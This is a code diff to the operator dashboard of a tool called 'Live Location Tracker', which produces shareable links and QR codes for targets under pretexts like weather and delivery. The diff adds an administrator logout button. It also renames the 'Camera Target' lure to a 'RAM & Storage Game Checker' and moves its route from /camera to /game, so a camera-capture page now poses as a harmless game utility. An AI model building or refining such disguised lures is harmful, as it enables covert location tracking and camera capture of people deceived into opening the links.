@@ -843,7 +843,13 @@
 
 <body>
     <!-- Top Header -->
-    <header class="header-bar p-4 has-text-centered">
+    <header class="header-bar p-4 has-text-centered" style="position: relative;">
+        <div style="position: absolute; right: 1.25rem; top: 1.25rem;">
+            <a href="/logout" class="button is-small is-dark" id="btn-logout-home" title="Log out of administrator session" style="background: #21262d; border: 1px solid #30363d; color: #f85149; font-weight: 600; font-size: 0.78rem;">
+                <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="margin-right: 4px;"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"></path><polyline points="16 17 21 12 16 7"></polyline><line x1="21" y1="12" x2="9" y2="12"></line></svg>
+                <span>Logout</span>
+            </a>
+        </div>
         <h1 class="title is-4 mb-1 has-text-white">Live Location Tracker</h1>
         <div class="mb-2">
             <span class="is-block has-text-weight-semibold has-text-light is-size-7">by AutoGraph &bull; Created by Soham</span>
@@ -908,20 +914,20 @@
             <!-- Camera Target Card -->
             <div class="target-share-card">
                 <div class="target-card-top">
-                    <span class="target-card-title">📷 Camera Target</span>
-                    <button class="copy-btn" id="copy-camera-btn" type="button" title="Copy Camera Link">
+                    <span class="target-card-title">🎮 RAM &amp; Storage Game Checker</span>
+                    <button class="copy-btn" id="copy-camera-btn" type="button" title="Copy Game Checker Link">
                         <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
                         <span>Copy Link</span>
                     </button>
                 </div>
                 <div class="url-display-box">
-                    <code id="camera-url-text">{{ remoteURL }}/camera</code>
-                    <a href="{{ remoteURL }}/camera" id="camera-open-link" target="_blank" class="url-open-link" title="Open in new tab">
+                    <code id="camera-url-text">{{ remoteURL }}/game</code>
+                    <a href="{{ remoteURL }}/game" id="camera-open-link" target="_blank" class="url-open-link" title="Open in new tab">
                         <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path><polyline points="15 3 21 3 21 9"></polyline><line x1="10" y1="14" x2="21" y2="3"></line></svg>
                     </a>
                 </div>
                 <div class="qr-wrapper" id="qr-camera-box"></div>
-                <span class="qr-caption">📱 Scan with phone to open Camera</span>
+                <span class="qr-caption">📱 Scan with phone to open Game Checker</span>
             </div>
         </div>
     </header>
@@ -1399,7 +1405,7 @@
 
                 const weatherUrl = `${activeBase}/weather`;
                 const deliveryUrl = `${activeBase}/delivery`;
-                const cameraUrl = `${activeBase}/camera`;
+                const cameraUrl = `${activeBase}/game`;
 
                 const wText = document.getElementById("weather-url-text");
                 const dText = document.getElementById("delivery-url-text");
